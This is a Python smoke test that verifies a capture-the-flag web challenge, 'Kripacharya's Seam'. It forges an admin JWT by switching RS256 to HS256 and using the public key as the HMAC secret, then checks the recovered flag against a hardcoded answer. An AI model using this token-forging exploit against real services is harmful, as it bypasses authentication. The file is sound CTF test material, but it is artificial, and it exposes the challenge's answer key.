#!/usr/bin/env python3
"""
ring2_smoke.py — Verification of Ring 2 (Web: Kripacharya's Seam)
Solves Ring 2 via JWT Algorithm Confusion (RS256 -> HS256 using public key as HMAC secret).
"""

import hmac
import json
import base64
import hashlib
import importlib.util
from pathlib import Path

EXPECTED_FLAG = "KRIPACHARYA_ADMIN_SEAM_EXPOSED_55d1"

def craft_forged_token(payload: dict, pub_key: str) -> str:
    header = {"alg": "HS256", "typ": "JWT", "kid": "kripa-portal-key-1"}
    h_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).rstrip(b'=')
    p_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).rstrip(b'=')
    signing_input = h_b64 + b'.' + p_b64
    sig = hmac.new(pub_key.encode('utf-8'), signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=')
    return (signing_input + b'.' + sig_b64).decode('utf-8')

def solve_ring2() -> str:
    base_dir = Path(__file__).resolve().parent.parent
    web_dir = base_dir / "rings" / "02-web"
    pub_key_path = web_dir / "keys" / "portal_pub.pem"
    
    assert pub_key_path.exists(), f"Public key not found: {pub_key_path}"
    pub_key = pub_key_path.read_text(encoding="utf-8")

    # Step 1: Craft forged admin token using HS256 with public key as HMAC secret
    forged_payload = {
        "sub": "abhimanyu_infiltrator",
        "role": "admin",
        "iss": "vyuha-portal",
        "scope": ["view_dashboard", "read_reports", "export_evidence"]
    }
    forged_token = craft_forged_token(forged_payload, pub_key)

    # Step 2: Validate the token against the actual Flask app
    app_path = web_dir / "app.py"
    spec = importlib.util.spec_from_file_location("web_app", app_path)
    web_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(web_module)

    client = web_module.app.test_client()
    res = client.get("/api/v1/dashboard", headers={"Authorization": f"Bearer {forged_token}"})
    assert res.status_code == 200, f"Dashboard returned unexpected status: {res.status_code}, data: {res.get_data(as_text=True)}"
    data = res.get_json()
    assert data.get("status") == "admin_granted"
    
    flag = data.get("intermediate_flag_2")
    return flag

def test_ring2():
    print("[*] Running Ring 2 (Web Security) Smoke Test...")
    flag = solve_ring2()
    print(f"[+] Recovered Ring 2 Flag: {flag}")
    assert flag == EXPECTED_FLAG, f"Flag mismatch! Expected: {EXPECTED_FLAG}, Got: {flag}"
    assert not flag.startswith("KCTF{"), "Intermediary flag must NOT be in KCTF format!"
    print("[+] Ring 2 Smoke Test PASSED!\n")

if __name__ == "__main__":
    test_ring2()
